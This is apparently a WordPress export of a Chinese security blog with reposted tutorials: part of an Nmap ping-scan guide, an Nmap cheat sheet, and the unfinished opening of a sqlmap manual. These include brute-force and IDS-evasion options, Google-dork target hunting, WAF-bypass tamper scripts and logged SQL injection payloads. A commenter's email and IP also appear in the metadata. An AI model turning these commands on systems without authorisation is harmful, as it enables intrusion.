“ -PS ”选项来实施 TCP SYN ping。
语法:<code>nmap –PS 目标</code>
<a class="highslide-image" target="_blank"><img title="10.png" alt="" data-original="" /></a>
默认的端口是80端口，你也可以指定其他的端口，例如：–PS22, 23, 25, 443。

<h3 id="tcp-ack-ping"><strong>TCP Ack Ping 扫描</strong></h3>

这种类型的扫描将只会扫描ACK包。
“ -PA ”在特定目标上进行一个 TCP ACK ping。
“ -PA ”选项会导致Nmap发送一个 TCP ACK 包给指定的主机。
语法:<code>nmap –PA target</code>
<a class="highslide-image" target="_blank"><img title="11.png" alt="" data-original="" /></a>
这种方法将会通过对一个TCP连接作出响应来尝试发现主机，这个TCP连接是一个不存在的连接，它正试图与目标主机建立一个响应。如同其他ping 选项一样，对于封锁标准ICMP ping的情况是非常有用的。

<h3 id="udp-ping"><strong>UDP Ping 扫描</strong></h3>

“ –PU ”扫描只会对目标进行 udp ping 扫描。这种类型的扫描会发送UDP包来获得一个响应。
语法:<code>nmap –PU target</code>
<a class="highslide-image" target="_blank"><img title="12.png" alt="" data-original="" /></a>
你可以指定一个扫描的端口号，例如 –PU 22, 80, 25, 等等。在上面的图片中，目标是我的局域网IP，在这个IP的主机中没有任何UDP服务。

<h3 id="sctp-ping"><strong>Sctp 初始 ping</strong></h3>

“ -PY ”参数告诉Nmap进行一个 SCTP 初始 ping. 这个选项将会发送一个包含最小的初始快STCP包。这种探测方法会尝试用SCTP来定位主机。SCTP通常被用在IP拨号服务的系统中。
语法:<code>nmap –PY 目标</code>
<a class="highslide-image" target="_blank"><img title="13.png" alt="" data-original="" /></a>
在上图中，尽管在这台主机上没有sctp服务，但是我们必须用-pn选项来进行探测。

<h3 id="icmp-ping"><strong>ICMP 回声应答 ping</strong></h3>

“ -PE ”参数进行一个ICMP(Internet控制报文协议) 在指定的系统上输出ping。
语法:<code>nmap –PE 目标</code>
<a class="highslide-image" target="_blank"><img title="14.png" alt="" data-original="" /></a>
这种类型的探测在ICMP数据包可以在有较少传输限制的系统上效果比较好。

<h3 id="icmpping"><strong>ICMP时间戳ping扫描</strong></h3>

“ -PP ”选项进行一个ICMP时间戳ping扫描。
<a class="highslide-image" target="_blank"><img title="15.png" alt="" data-original="" /></a>

<h3 id="icmpping_1"><strong>ICMP地址掩码ping</strong></h3>

“ -PM ”选项进行一个ICMP地址掩码ping扫描。
语法:<code>nmap –PM 目标</code>
<a class="highslide-image" target="_blank"><img title="16.png" alt="" data-original="" /></a>
这种非常规的ICMP查询（和 -PP 选项类似）试图用备选的ICMP登记ping指定的主机。这种类型的ping可以偷偷的通过配置好封锁标准回声请求的防火墙。

<h3 id="ipping"><strong>IP协议Ping</strong></h3>

“ -PO ”选项进行一个IP协议ping。
语法:<code>nmap –PO 协议 目标</code>
<a class="highslide-image" target="_blank"><img title="17.png" alt="" data-original="" /></a>
IP协议ping用指定的协议发送一个包给目标。如果没有指定协议，默认的协议是 1 (ICMP), 2 (IGMP)和4 (IP-in-IP)。

<h3 id="arp-ping"><strong>ARP ping</strong></h3>

“ –PR ”选项被用来实施一个arp ping 扫描。“ -PR ”选项告诉Nmap对目标主机进行一个APR(地址解析协议) ping.
语法: <code>nmap –PR 目标</code>
<a class="highslide-image" target="_blank"><img title="18.png" alt="" data-original="" /></a>
“ -PR ”选项当扫描整个网络的时候自动使用。这种类型的探测比其他的ping方法更快。
路由跟踪
“ –traceroute ”参数可以用来追踪到指定主机的网络路径。
语法: <code>nmap –traceroute 目标</code>
<a class="highslide-image" target="_blank"><img title="19.png" alt="" data-original="" /></a>

<h3 id="_12"><strong>强制使用反向域名解析</strong></h3>

“ -R ”参数告诉Nmap总是对目标IP地址实施一个逆向DNS解析。
语法: <code>nmap –R 目标</code>
<a class="highslide-image" target="_blank"><img title="20.png" alt="" data-original="" /></a>
“ -R “选项可以用在对一个IP地址块实施探测的时候，Nmap将试图对每个IP地址进行反向向DNS信息解析。

<h3 id="_13"><strong>不用反向域名解析</strong></h3>

“ -n ”参数用来说明不使用反向域名解析。
语法:<code>nmap –n 目标</code>
<a class="highslide-image" target="_blank"><img title="21.png" alt="" data-original="" /></a>
反向域名解析会明显的降低Nmap扫描的速度。使用“-n”选项会极大的减少扫描时，特别是当扫描大量的主机时。如果你不关心目标系统的DNS信息，更喜欢进行一个能快速产生结果的扫描时，可以使用这个选项。

<h3 id="dns"><strong>DNS查询方法的取舍</strong></h3>

“ –system-dns ”选项告诉Nmap使用主机系统的域名解析来替代它自己的内部方法。
语法:<code>nmap –system-dns 目标</code>
<a class="highslide-image" target="_blank"><img title="22.png" alt="" data-original="" /></a>

<h3 id="dns_1"><strong>手动指定DNS服务器</strong></h3>

“ –dns-servers ”选项可以用来在扫面的时候手动指定查询的DNS服务器。
语法: <code>nmap –dns-servers 服务器1 服务器2 目标</code>
<strong><a class="highslide-image" target="_blank"><img title="23.png" alt="" data-original="" /></a></strong>
” –dns-servers “选项允许你指定一个或者更多的替代服务器来宫Nmap查询。这对于没有DNS配置的系统是非常有用的，而且如果你想阻止你的扫描查询出现在你配置在本地DNS服务器的记录文件中，这个选项也是有用的。

<h3 id="_14"><strong>列表扫描</strong></h3>

” -sL “选项将会显示一个列表，并对指定的IP地址执行一个反向DNS查询。
语法:<code>nmap –sL 目标</code>
<a class="highslide-image" target="_blank"><img title="24.png" alt="" data-original="" /></a>
在下一个I部分中，我将会讨论怎么用不同的方法发现服务，主机和旗标。同时，我们也将会讨论怎么发现防火墙以及怎么通过使用Nmap的NSE来绕过它以及怎么编写你自己的Nmap脚本引擎。Nmap中最重要的部分是知道怎么样发现漏洞和利用他们，拭目以待。
&nbsp;

<div><small>来源： &lt;<a href="http://www.freebuf.com/articles/network/32302.html">http://www.freebuf.com/articles/network/32302.html</a><small>&gt;</small></small></div>

<small><small> </small></small>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>31</wp:post_id>
		<wp:post_date><![CDATA[2015-10-12 14:03:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-12 06:03:48]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[123]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="nmap"><![CDATA[Nmap]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[241]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>3</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.146.118.3]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-10-12 14:27:51]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-10-12 06:27:51]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:v:]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title>Nmap速查表</title>
		<link>https://www.nervgeek.com/2015/10/12/nmap%e9%80%9f%e6%9f%a5%e8%a1%a8/</link>
		<pubDate>Mon, 12 Oct 2015 08:21:06 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=67</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>基本语法：</strong>
#nmap [扫描方式] [命令选项] {目标}
<strong>扫描目标格式：</strong>
IPv4 地址： 192.168.1.1
IPv6 地址：AABB:CCDD::FF%eth0
主机名：www.target.tgt
IP 地址范围：192.168.0-255.0-255
掩码格式：192.168.0.0/16
使用列表文件：-iL &lt;filename&gt;
<strong>设置扫描端口</strong>
无端口范围时扫描1000 个常用端口
-F 扫描100个最常用端口
-p&lt;port1&gt;-&lt;port2&gt;   指定端口范围
-p&lt;port1&gt;,&lt;port2&gt;,…. 端口列表
-pU:53,U:110,T20-445  TCP&amp;UDP结合
-r   线性扫描（不是随机扫描）
–top-ports &lt;n&gt;   扫描n个最常用端口
-p-65535    忽略初始端口，nmap从端口1开始扫描
-p0-        忽略结束端口，nmap扫描至65535端口
-p-         扫描0-65535端口
<!--more-->
<strong>脚本引擎</strong>
-sC 运行默认脚本
–script=&lt;ScriptName&gt;
运行个人脚本或批量脚本
–script-args=&lt;Name1=value1,…&gt;
使用脚本参数列表
–script-updatedb
更新脚本数据库
<strong>值得关注的脚本</strong>
完整版nmap脚本引擎的脚本在http://nmap.org/nsedoc/
一些特别有用的脚本包括：
dns-zone-transfer：尝试从dns服务器上拖一个AXFR请求的区域文件
$nmap –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=&lt;domain&gt; -p53 &lt;hosts&gt;
http-robots.txt:在发现的web服务器中获取robots.txt文件
$nmap –script http-robots.txt &lt;hosts&gt;
smb-brute:通过自动猜解尝试爆破username 和password组合
$nmap –script smb-brute.nse -p445 &lt;hosts&gt;
smb-psexec: 用登陆凭据作为脚本参数，在目标机器上运行一系列程序
$nmap –script smb-psexec.nse –script-args=smbuser=&lt;username&gt;,smbpass=&lt;password&gt;[,config=&lt;config&gt;] -p445 &lt;hosts&gt;
<strong>脚本种类</strong>
nmap 的脚本种类包括但不限于下面种类：
auth：利用或绕过目标主机的访问控制
broadcast：通过本地网络广播发觉不包含在命令行内的主机
brute：针对目标主机猜解密码，支持各类协议，包括：http，SNMP，      IAX，MySQL,VNC等。
default：当出现“-sC”或“-A”命令时此脚本自动运行
discovery：通过公开的资源信息，SNMP协议，目录服务等获取更多目标主机信息。
dos：会造成目标主机拒绝服务
exploit：尝试exploit目标
external：与不在目标列表的第三方系统交互
fuzzer： 在网络协议的规定内发送意想不到的请求
intrusive：可能会使目标崩溃，消耗过度的资源，或者通过恶意行为冲击目标系统
malware：在目标主机上寻找恶意软件感染迹象
safe：尽量不用负面的方式影响目标
version：估计目标主机显示的软件或协议版本
vul：判断目标主机是否存在一个已知漏洞
<strong>深入扫描命令</strong>
-Pn  不探测扫描（假定所有主机都存活）
-PB  默认探测扫描（探测端口：TCP 80，445&amp;ICMP）
-PS&lt;portlist&gt;  tcp探测扫描
-PE  ICMP Echo Request
-PP  ICMP Timestamp Request
-PM  ICMP Netmask Request
<strong>扫描类型</strong>
-sP  只探测主机在线情况
-sS  SYN扫描（隐身扫描）
-ST  TCP扫描
-sU  UDP扫描
-sV  系统版本检测
-O   操作系统识别
–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）
<strong>细粒度的时间选项</strong>
–min-hostgroup/max-hostgroup &lt;size&gt;  平行的主机扫描组的大小
–min-parallelism/max-parallelism &lt;numprobes&gt;  并行探测
–min-rtt-timeout/max-rtttimeout/initial-rtt-timeout &lt;time&gt;   指定每轮探测的时间
–max-retries &lt;tries&gt;    扫描探测的上限次数设定
–host-timeout &lt;time&gt;    设置timeout时间
–scan-delay/–max-scan-delay &lt;time&gt;  调整两次探测之间的延迟
–min-rate &lt;number&gt;     每秒发送数据包不少于&lt;number&gt;次
<strong>时序选项</strong>
-T0  偏执的：非常非常慢，用于IDS逃逸
-T1  猥琐的：相当慢，用于IDS逃逸
-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍
-T3  普通的：默认，根据目标的反应自动调整时间模式
-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标
-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口
<strong>输出格式</strong>
-oN  标准输出
-oG  好理解的格式
-ox  xml格式<span class="Apple-tab-span"> </span>
-oA&lt;basename&gt;  用&lt;basename&gt;生成以上格式的文件
<strong>misc选项</strong>
-n  禁止反向IP地址查找
-6  只是用 IPv6
-A  是用几个命令：OS 探测，版本探测，脚本扫描，traceroute
–reason 列出nmap的判断：端口开放，关闭，被过滤。
&nbsp;

<div><small>来源： &lt;<a href="http://www.freebuf.com/tools/16410.html">http://www.freebuf.com/tools/16410.html</a><small>&gt;</small></small></div>

<small><small> </small></small>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>67</wp:post_id>
		<wp:post_date><![CDATA[2015-10-12 16:21:06]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-12 08:21:06]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nmap%e9%80%9f%e6%9f%a5%e8%a1%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="nmap"><![CDATA[Nmap]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[178]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>sqlmap用户手册</title>
		<link>https://www.nervgeek.com/2015/10/12/sqlmap%e7%94%a8%e6%88%b7%e6%89%8b%e5%86%8c/</link>
		<pubDate>Mon, 12 Oct 2015 08:36:39 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=69</guid>
		<description></description>
		<content:encoded><![CDATA[当给sqlmap这么一个url的时候，它会：

<pre class="highlight">1、判断可注入的参数
2、判断可以用那种SQL注入技术来注入
3、识别出哪种数据库
4、根据用户选择，读取哪些数据
</pre>

sqlmap支持五种不同的注入模式：

<pre class="highlight">1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4、联合查询注入，可以使用union的情况下的注入。
5、堆查询注入，可以同时执行多条语句的执行时的注入。
</pre>

sqlmap支持的数据库有：

<pre class="highlight">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
</pre>

可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。
<!--more-->
测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。
可以设定HTTP(S)请求的并发数，来提高盲注时的效率。
Youtube上有人做的使用sqlmap的视频：
<a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a>
<a href="http://www.youtube.com/user/stamparm/videos">http://www.youtube.com/user/stamparm/videos</a>
使用sqlmap的实例文章：
<a href="http://unconciousmind.blogspot.com/search/label/sqlmap">http://unconciousmind.blogspot.com/search/label/sqlmap</a>
可以点击<a href="https://github.com/sqlmapproject/sqlmap/tarball/master">https://github.com/sqlmapproject/sqlmap/tarball/master</a>下载最新版本sqlmap。
也可以使用git来获取sqlmap

<pre class="highlight">git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
</pre>

之后可以直接使用命令来更新

<pre class="highlight">python sqlmap.py --update
</pre>

或者

<pre class="highlight">git pull
</pre>

更新sqlmap
如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。
共有七个等级，默认为1：

<pre class="highlight">0、只显示python错误以及严重的信息。
1、同时显示基本信息和警告信息。（默认）
2、同时显示debug信息。
3、同时显示注入的payload。
4、同时显示HTTP请求。
5、同时显示HTTP响应头。
6、同时显示HTTP响应页面。
</pre>

如果你想看到sqlmap发送的测试payload最好的等级就是3。

<h2>获取目标方式</h2>

<hr />

<h3>目标URL</h3>

参数：-u或者--url
格式：<code>http(s)://targeturl[:port]/[…]</code>
例如：<code>python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users</code>
从Burp或者WebScarab代理中获取日志
参数：-l
可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。

<h3>从文本中获取多个目标扫描</h3>

参数：-m
文件中保存url格式如下，sqlmap会一个一个检测

<pre class="highlight">www.target1.com/vuln1.php?q=foobar
www.target2.com/vuln2.asp?id=1
www.target3.com/vuln3/id/1*
</pre>

<h3>从文件中加载HTTP请求</h3>

参数：-r
sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
比如文本文件内如下：

<pre class="highlight">POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0
id=1
</pre>

当请求是HTTPS的时候你需要配合这个--force-ssl参数来使用，或者你可以在Host头后面加上:443

<h3>处理Google的搜索结果</h3>

参数：-g
sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。
例子：

<pre class="highlight">python sqlmap.py -g "inurl:\".php?id=1\""
</pre>

（很牛B的功能，测试了一下，第十几个就找到新浪的一个注入点）
此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。

<h2>请求</h2>

<hr />

<h3>http数据</h3>

参数：--data
此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。
例子：

<pre class="highlight">python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
</pre>

<h3>参数拆分字符</h3>

参数：--param-del
当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
例子：

<pre class="highlight">python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
</pre>

<h3>HTTP cookie头</h3>

参数：--cookie,--load-cookies,--drop-set-cookie
这个参数在以下两个方面很有用：
1、web应用需要登陆的时候。
2、你想要在这些头参数中测试SQL注入时。
可以通过抓包把cookie获取到，复制出来，然后加到--cookie参数里。
在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。
如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。
当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。

<h3>HTTP User-Agent头</h3>

参数：--user-agent,--random-agent
默认情况下sqlmap的HTTP请求头中User-Agent值是：

<pre class="highlight">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
</pre>

可以使用--user-anget参数来修改，同时也可以使用--random-agnet参数来随机的从./txt/user-agents.txt中获取。
当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。

<h3>HTTP Referer头</h3>

参数：--referer
sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。

<h3>额外的HTTP头</h3>

参数：--headers
可以通过--headers参数来增加额外的http头

<h3>HTTP认证保护</h3>

参数：--auth-type,--auth-cred
这些参数可以用来登陆HTTP的认证保护支持三种方式：
1、Basic
2、Digest
3、NTLM
例子：

<pre class="highlight">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
</pre>

<h3>HTTP协议的证书认证</h3>

参数：--auth-cert
当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。
key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。

<h3>HTTP(S)代理</h3>

参数：--proxy,--proxy-cred和--ignore-proxy
使用--proxy代理是格式为：http://url:port。
当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。
--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。

<h3>HTTP请求延迟</h3>

参数：--delay
可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。

<h3>设定超时时间</h3>

参数：--timeout
可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。

<h3>设定重试超时</h3>

参数：--retries
当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。

<h3>设定随机改变的参数值</h3>

参数：--randomize
可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。

<h3>利用正则过滤目标网址</h3>

参数：--scope
例如：

<pre class="highlight">python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
</pre>

<h3>避免过多的错误请求被屏蔽</h3>

参数：--safe-url,--safe-freq
有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
绕过这个策略有两种方式：

<pre class="highlight">1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
</pre>

<h3>关掉URL参数值编码</h3>

参数：--skip-urlencode
根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。

<h3>每次请求时候执行自定义的python代码</h3>

参数：--eval
在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。
例子：

<pre class="highlight">python sqlmap.py -u "http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
</pre>

上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。

<h2>注入</h2>

<hr />

<h2>测试参数</h2>

参数：-p,--skip
sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p "id,user-anget"
当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。
例如：--skip="user-angent.referer"
在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*
例如：

<pre class="highlight">python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
</pre>

sqlmap将会测试value1的位置是否可注入。

<h3>指定数据库</h3>

参数：--dbms
默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：

<pre class="highlight">MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
</pre>

<h3>指定数据库服务器系统</h3>

参数：--os
默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。

<h3>指定无效的大数字</h3>

参数：--invalid-bignum
当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。

<h3>只定无效的逻辑</h3>

参数：--invalid-logical
原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。

<h3>注入payload</h3>

参数：--prefix,--suffix
在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。
例如，代码中是这样调用数据库的：

<pre class="highlight">$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1";
</pre>

这时你就需要--prefix和--suffix参数了：

<pre class="highlight">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
</pre>

这样执行的SQL语句变成：

<pre class="highlight">$query = "SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1";
</pre>

<h3>修改注入的数据</h3>

参数：--tamper
sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用--tamper参数对数据做修改来绕过WAF等设备。
下面是一个tamper脚本的格式：

<pre class="highlight"># Needed imports
from lib.core.enums import PRIORITY
# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL
def tamper(payload):
    '''
    Description of your tamper script
    '''
    retVal = payload
    # your code to tamper the original payload
    # return the tampered payload
    return retVal
</pre>

可以查看 tamper/ 目录下的有哪些可用的脚本
例如：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
[hh:mm:03] [DEBUG] cleaning up configuration parameters
[hh:mm:03] [INFO] loading tamper script 'between'
[hh:mm:03] [INFO] loading tamper script 'randomcase'
[hh:mm:03] [INFO] loading tamper script 'space2comment'
[...]
[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
[...]
[hh:mm:04] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'
[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
group/**/bY/**/x)a)
[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING
clause' injectable
[...]
</pre>

<h2>探测</h2>

<hr />

<h3>探测等级</h3>

参数：--level
共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。
这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。
总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。

<h3>风险等级</h3>

参数：--risk
共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。
测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。

<h3>页面比较</h3>

参数：--string,--not-string,--regexp,--code
